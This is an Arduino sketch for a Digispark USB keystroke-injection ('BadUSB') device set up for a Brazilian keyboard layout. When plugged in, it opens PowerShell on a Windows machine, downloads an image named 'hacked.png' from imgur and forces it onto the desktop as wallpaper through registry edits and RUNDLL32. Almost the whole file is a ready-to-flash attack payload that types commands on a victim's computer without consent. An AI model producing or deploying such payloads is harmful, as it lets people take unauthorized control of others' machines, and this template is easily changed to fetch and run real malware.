#include "DigiKeyboardPtBr.h"
void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("$client.DownloadFile(\"https://i.imgur.com/CxlR8vf.png\" , \"hacked.png\")");
  DigiKeyboard.delay(15000);
  DigiKeyboardPtBr.println("$client.DownloadFile(\"https://i.imgur.com/CxlR8vf.png\" , \"hacked.png\")");
  DigiKeyboard.delay(15000);
  DigiKeyboardPtBr.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v WallPaper /t REG_SZ /d \"%USERPROFILE%\\hacked.png\" /f");
  DigiKeyboard.delay(500);
   DigiKeyboardPtBr.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v WallPaper /t REG_SZ /d \"%USERPROFILE%\\hacked.png\" /f");
  DigiKeyboard.delay(500);
   DigiKeyboardPtBr.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v WallPaper /t REG_SZ /d \"%USERPROFILE%\\hacked.png\" /f");
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
  DigiKeyboard.delay(500);
  DigiKeyboardPtBr.println("exit");
}
void loop() {
  
}
